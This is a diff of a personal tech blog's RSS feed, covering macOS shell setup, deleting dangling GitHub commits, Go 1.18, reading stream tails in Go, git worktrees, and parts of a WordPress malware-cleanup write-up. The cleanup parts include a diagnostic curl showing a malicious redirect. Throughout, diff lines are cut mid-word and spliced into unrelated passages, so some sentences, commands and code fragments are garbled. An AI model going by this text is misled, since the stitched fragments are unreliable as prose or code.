-<p>VPN providers are often a bit shady, the one exception for me is <a href="https://mullvad.net/en/">Mullvad</a>.  They <a href="https://mullvad.net/de/blog/2017/7/13/mullvad-donates-wireguard/">support the development of Wireguard</a> and they their client is open source.  Also, they go a long way in trying to use as less data as possible from you.  What other service provider allows you to register without entering any personal information?  I know none.</p>
-<h2>Shell Setup</h2>
-<p>On Linux I used <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> as my terminal emulator of choice but they don't notarize their binaries for macOS, which I can understand somehow.  Luckily there is <a href="https://iterm2.com/">iterm2</a> which feels like a proper replacement.</p>
-<p>I haven't adapted my <a href="https://github.com/klingtnet/dotfiles">dotfiles</a> repository yet and decided to start from scratch with this system.  My <code>.gitconfig</code> is rather simple:</p>
-<pre><code class="language-ini">[pull]
-	ff = only
-[user]
-	email = &lt;redacted&gt;
-	name = Andreas Linz
-	signingkey = &lt;redacted&gt;
-[core]
-	editor = vim
-
-[alias]
-	p = push
-	co = checkout
-	s = status
-	c = commit
-	a = add
-	hash = rev-parse HEAD
-	todos = ! git diff --name-only &quot;$1&quot; | xargs rg --no-heading --trim TODO
-[init]
-	defaultBranch = master
-
-[url &quot;git@github.com:&quot;]
-	  insteadOf = gh:
-[commit]
-	gpgsign = true
-</code></pre>
-<p>Coming from Linux the thing I miss most is a package manager, especially when you're used to something like <code>pacman</code> from Arch Linux.  The situation on macOS is not as bad as on Windows but at least we have <a href="https://brew.sh/">homebrew</a> and <a href="https://www.macports.org/">MacPorts</a>.  I went with homebrew because that's what everyone is using and despite its terminology where everything is named after thins in a brewery or bar.  Since GUI applications usually come with an auto updater I decided to only install CLI tools and libraries with <code>brew</code>.</p>
-<p>With the URL rewrite from above's gitconfig I can easily clone repositories from GitHub by doing <code>git clone gh:org/repo</code>.  But there is <a href="https://github.com/cli/cli">GitHub CLI</a> that can do much more, like managing issues, pull requests or watch running actions.  That's the first tool I've installed using <code>brew</code>, not because I use it that often, just because it was the first tool that came to my mind.</p>
-<p>Shameless plug, <a href="https://github.com/klingtnet/netdrop">netdrop</a> is a tool that proved to be helpful.  It allows me to send a pipe over my local network, or just a file.  Most of my config files were copied like that.</p>
-<p>My shell setup is pretty simple since a while.  On Arch Linux is used plain bash with a minimal configuration and a custom <a href="https://github.com/klingtnet/dotfiles/tree/master/tools/rusty-prompt">Rust prompt renderer</a>.  The default shell on macOS is <code>zsh</code> so I went with that.  Instead of my own prompt renderer I now use <a href="https://starship.rs/">starship</a> which is pretty powerful out of the box and requires almost no configuration.  This is how my <code>~/.zshrc</code> looks like:</p>
-<pre><code class="language-bash">HISTFILE=~/.zsh_history
-HISTSIZE=999999999
-SAVEHIST=$HISTSIZE
-
-# setopt inc_append_history
-setopt share_history
-setopt hist_ignore_dups
-setopt hist_ignore_space
-
-alias ll='ls -alh'
-alias cdtemp='cd $(mktemp -d)'
-
-# autocompletion
-# https://stackoverflow.com/a/58517668
-autoload -Uz compinit &amp;&amp; compinit -u
-
-# https://stackoverflow.com/a/12403798
-bindkey &quot;^[[1;3C&quot; forward-word
-bindkey &quot;^[[1;3D&quot; backward-word
-
-# ... shell completions were omitted.
-
-eval &quot;$(starship init zsh)&quot;
-</code></pre>
-<p>Before I switched to <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> I was using <a href="https://github.com/gnunn1/tilix">tilix</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> because it supported terminal splitting, tabs and so on.  The reason for using alacritty was that it us]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>How to delete unreachable commits on GitHub</title>
-      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
-      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
-  
-  <title>How to delete unreachable commits on GitHub</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>How to delete unreachable commits on GitHub</h1>
-<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <a href="https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md#L3">commit</a> shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
-<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
-<p>As you can clearly see the commit is still there, and I only discovered this by accident when using GitHub's search.  So, the question is now how to delete this commit?  I cannot even reach the commit from my local repository:</p>
-<pre><code class="language-shell">$ git show b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
-fatal: bad object b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
-</code></pre>
-<p>Its parent commit is reachable though:</p>
-<pre><code class="language-shell">$ git show 01aea0c8e1bdceb7869403814a4ebb87e25883b2
-commit 01aea0c8e1bdceb7869403814a4ebb87e25883b2
-Author: Andreas Linz &lt;klingt.net@gmail.com&gt;
-Date:   Sun Jul 25 16:18:10 2021 +0200
-
-    Initial commit
-</code></pre>
-<p>If the commit would still be part of my local repository I could have removed it with this call and subsequent <code>git push</code>.</p>
-<pre><code class="language-shell">$ git reflog expire --expire-unreachable=all
-</code></pre>
-<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/ticket/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
-<blockquote>
-<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
-</blockquote>
-<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>Go 1.18 with some fuzzing and a focus on generics</title>
-      <link>https://klingt.net/articles/go-1-18-with-some-fuzzing-and-a-focus-on-generics.html</link>
-      <description>Go 1.18 is the biggest release since Go 1.0 came out.  In this article I will summarize most of the updates and additions and I will also give a more in-depth look into generics.  This article will also be the basis of the talk I will give at the #25 Golang Leipzig meetup.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="Go 1.18 is the biggest release since Go 1.0 ]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
       <title>Go 1.18 with some fuzzing and a focus on generics</title>
@@ -1020,7 +1054,23 @@ Date:   Sun Jul 25 16:18:10 2021 +0200
   <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
   
   <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="scrajor features that got introduced to Go, those are:</p>
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>Go 1.18 with some fuzzing and a focus on generics</h1>
+<p>Go 1.18<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> is the biggest release since the Go version 1.0 came out in 2012.  What made this release so important are two major features that got introduced to Go, those are:</p>
 <ul>
 <li>generics</li>
 <li>and fuzz testing support.</li>
@@ -1043,13 +1093,6 @@ hello: go1.18rc1
         build   GOOS=darwin
         build   vcs=git
         build   vcs.revision=9b40c4e23a9f695c5f2adb7886d7d45f3e395eb7
-        build   vcs.time=2022-02-19T11:59:45Z
-        build   vcs.modified=true
-</code></pre>
-<h2><code>net/netip</code></h2>
-<p><a href="https://tailscale.com/blog/netaddr-new-ip-type-for-go/">Tailscales' custom IP address struct</a> landed in the standard library.  In contrast to <a href="https://pkg.go.dev/net#IPAddr"><code>net.IPAddr</code></a> this type is immutable, takes less memory and is comparable making it usable as a map key.  Brad Fitzpatrick did a talk about <a href="https://archive.fosdem.org/2021/schedule/event/gotailscale/">Go at Tailscale</a> in FOSDEM 2021 where he goes into the details why they needed a new IP type.</p>
-<h2>Miscellaneous changes</h2>
-<p>With <code>strings.Cut()</code> you can cut a string around the first instance of a separator, e.g. <code>strings.Cut(&quot;a,b,c&quot;, &quot;,&quot;)</code> will result in 6d7d45f3e395eb7
         build   vcs.time=2022-02-19T11:59:45Z
         build   vcs.modified=true
 </code></pre>
@@ -1166,26 +1209,32 @@ func Write(w io.Writer) error {}
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
-<p>For this article <a href="https://go.dev/dl/#go1.18rc10">Go 1.18 release candidate 1</a> was used.  This relea]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>How I Detected and Removed Malware from a Wordpress Installation</title>
-      <link>https://klingt.net/articles/how-i-detected-and-removed-malware-from-a-wordpress-installation.html</link>
-      <description>Wordpress is the major target for malware, mainly because it&#39;s so widespread, often unmaintained, and plugins add additional loopholes to the already fragile CMS.  Even with auto updates enabled, your Wordpress instance will not be safe from getting infected with malware.  In this article I will describe how I removed a malware from an up-to-date wordpress instance and describe what I found there.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
+<p>For this article <a href="https://go.dev/dl/#go1.18rc10">Go 1.18 release candidate 1</a> was used.  This release can be installed by running <code>go install golang.org/dl/go1.18rc1@latest &amp;&amp; go1.18rc1 download</code>.  Any other details were mostly found in the <a href="https://tip.golang.org/doc/go1.18#library">preliminary release notes</a>.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>Also for PowerPC, but I don't know anyone targeting those CPUs.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p>Someone took the opportunity to implement a <a href="https://github.com/carlmjohnson/new"><code>new</code> package</a>.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
 
-<head>
-  <meta charset="utf]]></content:encoded>
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
-      <title>How to delete unreachable commits on GitHub</title>
-      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
-      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
+      <title>Reading the last bytes of a stream in Go</title>
+      <link>https://klingt.net/articles/reading-the-last-bytes-of-a-stream-in-go.html</link>
+      <description>In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.</description>
       <content:encoded><![CDATA[<!doctype html>
 <html lang="en">
 
@@ -1193,9 +1242,9 @@ func Write(w io.Writer) error {}
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
+  <meta name="description" content="In this post I explain how to efficiently read the last bytes of a stream of file, just like the good old tail utility.">
   
-  <title>How to delete unreachable commits on GitHub</title>
+  <title>Reading the last bytes of a stream in Go</title>
 
   <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
   <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
@@ -1220,35 +1269,61 @@ func Write(w io.Writer) error {}
     <div class="main">
       <main>
         
-<h1>How to delete unreachable commits on GitHub</h1>
-<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <a href="https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md#L3">commit</a> shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
-<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
-<p>As you can clearly se-sh">$ curl -I -H 'referer: infected-website.de' https://infected-website.de/page` 
-HTTP/1.1 302 Found
-Date: Sun, 03 Apr 2022 16:37:56 GMT
-Server: Apache/2.4.53 (Debian)
-X-Powered-By: PHP/7.4.28
-Set-Cookie: sl_message=admin; expires=Thu, 01-Jan-2032 00:00:00 GMT; Max-Age=307524123; path=/
-Location: https://family-drugs.net/
-Content-Type: text/html; charset=UTF-8
+<h1>Reading the last bytes of a stream in Go</h1>
+<p>It's about half a year since my last blog post, so it's about time to write another one.</p>
+<p>Yesterday I was working on a private project that required to read a block of bytes from the end of an <code>io.Reader</code>.
+On a first glance that sounds like a trivial problem, but doing this <em>efficiently</em> turned out to be more complicated than initially thought.</p>
+<p>If your <code>io.Reader</code> stems from a file you're lucky, because regular files allow random access through the system <a href="https://man7.org/linux/man-pages/man2/lseek.2.html">seek call</a> that is exposed on a <code>os.File</code> with its <a href="https://pkg.go.dev/os#File.Seek"><code>Seek</code> method</a>.  However, my function only accepts a plain <code>io.Reader</code> and not an <code>os.File</code>, so this option is out of question.</p>
+<p>How can we read the last N bytes of a <em>finite</em> stream of some kind?</p>
+<h2>Naïve solution</h2>
+<p>A naïve solution would be to <a href="https://pkg.go.dev/io#ReadAll">read the whole file into memory</a> and then discard everything except for some slice of bytes at the end.</p>
+<pre><code class="language-go">func readTail(r io.Reader, N int) ([]byte, error) {
+	data, err := io.ReadAll(r)
+	if err != nil {
+		return nil, err
+	}
+
+	return data[len(data)-N:], nil
+}
 </code></pre>
-<p>Actually, it didn't matter which value the <code>referer</code> header had, it only had to be present.   Also, they set a cookie for whatever reason.</p>
-<h2>Run the Wordpress Website Locally</h2>
-<p>We're left with only three candidates that can contain the malware, Apache, Wordpress or its database.  Apache being the most unlikely of the three because the website was hosted on a professional hosting service and then a bunch of customers would have been affected as well.  Anyhow, thipire-unreachable=all
+<p>This is pretty wasteful and might require huge amounts of memory, depending on how long the stream you want to consume is.</p>
+<h2>Two interleaved buffers</h2>
+<p>The next idea I had was to read the stream in chunks of size N, and discarding every chunk except the last one.
+But this won't work because of a variety of reasons, first and foremost if the stream length is not an integer multiple of N then the last chunk might be incomplete since it is only the remainder of file size divided by chunk size (N).</p>
+<p><img src="unalinged-end-of-file-read.png" alt="illustration of an unaligned read"></p>
+<p>So, why not maintain two buffers, one for the previous read and another one for the current read.
+When reaching EOF we can then concatenate the second last read with the last and return an slice of size N, right?
+This might work, but turns out to be pretty complicated because of how <code>io.Read</code> might behave.
+A call to <code>Read</code> is not guaranteed to return <code>N</code> bytes, instead it might fill only a <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=60-61">part of the given buffer</a>:</p>
+<pre><code class="language-go">// If some data is available but not len(p) bytes, Read conventionally
+// returns what is available instead of waiting for more.
 </code></pre>
-<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/ticket/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
-<blockquote>
-<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
-</blockquote>
-<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
+<p>So, we can't easily fill the two buffers in an interleaved manner because a single read might not fill a whole buffer.
+Of course, there's <a href="https://pkg.go.dev/io#ReadFull"><code>io.ReadFull</code></a> which takes care of reading exactly N bytes if available, but the logic would still be quite convoluted.</p>
+<h2>Ring buffer</h2>
+<p>After dabbling around for a while with the solution I had, I realized that what I wrote looked almost like a <a href="https://en.wikipedia.org/wiki/Circular_buffer">ring buffer</a>.
+With a ring buffer, sometimes also called circular buffer, we only need O(n) space instead of O(2n) as required with the previous concept.
+The gist is to store each chunk in a ring buffer, wrapping around if it exceeds the end of the ring buffers internal array.</p>
+<p><img src="ring-buffer-end-of-file-read.png" alt="illustration of reading chunks with a ring buffer"></p>
+<p>After we reached the end of the stream we can just return a slice from the ring buffer, starting from the write head and reaching back N bytes.
+Those are two operations if we need to wrap around</p>
+<pre><code class="language-go">copy(dst[:N-wpos], ringbuf[wpos:])
+copy(dst[N-wpos:], ringbuf[:wpos])
+</code></pre>
+<p>where <code>wpos</code> is the index of the write head.</p>
+<p>One thing that bit me was that <code>io.Read</code> might return <code>io.EOF</code> together with a non-zero amount of bytes read, <em>or</em> it could return <code>0, io.EOF</code> after the last call that returned a non-zero amount of bytes and a <code>nil</code> error.
+This is <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19.2:src/io/io.go;l=83">documented behavior</a> but could still be surprising.</p>
+<pre><code class="language-go">// An instance of this general case is that a Reader returning
+// a non-zero number of bytes at the end of the input stream may
+// return either err == EOF or err == nil. The next Read should
+// return 0, EOF.
+</code></pre>
+<p>You can find an ugly example in <a href="https://go.dev/play/p/M-WcpkVviGV">this playground</a> but be aware that you need to run it locally, since external URLs might not be resolved in the playground.</p>
+<p>There are a number of performance considerations that arise from this implementation, e.g. a very small <code>N</code> might lead to a huge number of read calls if the ring buffer's size is equal to <code>N</code>.
+Technically they are independent, the only condition is that the ring buffer must at least have a size of <code>N</code>.</p>
+<p>You might've guessed it already but the good old <code>tail</code> utility serves the same purpose.  I haven't had a look in <a href="https://github.com/coreutils/coreutils/blob/master/src/tail.c">GNU tail's source code</a> yet, but I'm curious to see how they achieved this.</p>
+<p>I hope that helped someone.
+Please let me know if you've an even more efficient solution or there is any other feedback for me.</p>
 
 
       </main>
@@ -1259,7 +1334,168 @@ Content-Type: text/html; charset=UTF-8
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>Git Worktrees (Update)</title>
+      <link>https://klingt.net/articles/git-worktrees-update.html</link>
+      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
+  
+  <title>Git Worktrees (Update)</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>Git Worktrees</h1>
+<p>At work I often face the situation that I want to locally review some feature branch of a colleague.
+In general that's easy, one <code>git switch --track origin/branch-name</code> later and you have the changes in your local repository.
+However, most of the time I was currently working in my own feature branch where I had unstaged changes.
+This means I needed to commit my local changes before I could switch to the colleague's branch.
+Wouldn't it be nice if I could work on multiple branches of a repository at the same time?</p>
+<p>You might be tempted to say, I know how to do that, just make a second clone of the repository and call it a day.
+That would work, of course, but it'd also be very wasteful since the whole repository needs to be cloned twice.
+For large repositories this could mean duplicating hundreds or thousands of megabytes.
+But guess what, git got you covered!  There's a lesser known command that handles exactly this use case, it's <a href="https://git-scm.com/docs/git-worktree">git worktree</a>.</p>
+<p>There's a variety of ways how to use git worktrees.</p>
+<h2>Existing repository</h2>
+<p>Let's assume that you're in some repository that you cloned a while a go and now you want to switch to a different branch without having to commit your local changes.
+We can do that by creating a new <em>worktree</em> like this:</p>
+<pre><code class="language-sh">$ git worktree add ../repository.feat-x origin/feat-x
+</code></pre>
+<p>This will create a copy, which shares the same <code>.git</code> data, in <code>../repository.feat-x</code> at branch <code>origin/feat-x</code>.
+It's sensible to not add the worktree inside the existing repository because then you would need to ignore the worktree directory.</p>
+<p>Checking out a new branch when creating a worktree is also very easy, just pass <code>-b my-branch-name</code>, that's it.</p>
+<p>If you're done with your work you can remove your worktree like</p>
+<pre><code class="language-sh">$ rm -rf ../repository.feat-x
+</code></pre>
+<p>or run</p>
+<pre><code class="language-sh">$ git worktree remove repository.feat-x
+</code></pre>
+<p>instead.
+But <code>git worktree remove</code> should be preferred, otherwise some metadata will not be removed until a <code>git gc</code> or <code>git worktree prune</code> was run.</p>
+<p>All worktrees of a repository can be listed with <code>git worktree list</code>.</p>
+<h2>New repository layout</h2>
+<p><strong>Update</strong>: In the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">previous version of this article</a> I used a <a href="https://git-scm.com/docs/git-clone#Documentation/git-clone.txt---bare">bare repository</a> but this will lead to problems since this type of repository is not intended to be updated or track remote changes.  I did found another simple solution that I will explain below.</p>
+<p>Let's say we want to patch something in the Go compiler on <code>master</code>, <code>1.19</code> and <code>1.18</code> branches.
+We can setup the project like this:</p>
+<pre><code class="language-sh">$ mkdir -p go/worktrees
+$ cd go/worktrees
+$ git clone git@github.com:golang/go master
+$ cd master
+# add the first worktree
+$ git worktree add -B release-branch.go1.19 ../go1.19
+# and the second worktree
+$ git worktree add -B release-branch.go1.18 ../go1.18
+</code></pre>
+<p>What we end up with is a project structure like this</p>
+<pre><code class="language-sh">$ tree -L 2 go
+go
+└── worktrees
+    ├── go1.18
+    ├── go1.19
+    └── master
+</code></pre>
+<p>where each directory below <code>/worktrees</code> contains the repository at a different branch.</p>
+<p>For work projects I could imagine a directory structure that looks similar to this:</p>
+<pre><code class="language-sh">go
+└── worktrees
+    ├── master
+    ├── feature
+    └── review
+</code></pre>
+<p>Note that each worktree just acts like a copy of the repository, so I can switch to whatever branch I like, i.e. the worktree is not pinned to the branch it was created with.
+In the example above I would use <code>work/</code> for my local feature development, <code>experiment/</code> for trying out some ideas, and <code>review/</code> whenever I need to checkout and review some feature of a colleague locally.</p>
+<p>Let me know what your experience with git worktree is and if and how you use it.</p>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>Git Worktrees</title>
+      <link>https://klingt.net/articles/git-worktrees.html</link>
+      <description>Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="Git Worktrees are a lesser known utility of git and I want to show how to use them and also motivate why I think they&#39;re useful.">
+  
+  <title>Git Worktrees</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<p>Please see the <a href="./git-worktrees-update.html">updated version of this article</a>.  On GitHub you can still find the <a href="https://github.com/klingtnet/klingtnet.github.io/blob/c800968678ffda04ec8a0cab04f28b7774dcefef/content/articles/2022-10-07-git-worktree.md">original version</a>.</p>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
       <title>How I Detected and Removed Malware from a Wordpress Installation</title>
@@ -1519,103 +1755,166 @@ class redir
 		
 //var_dump($this-&gt;url);
 		
-        if (!$this-&gt;st]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
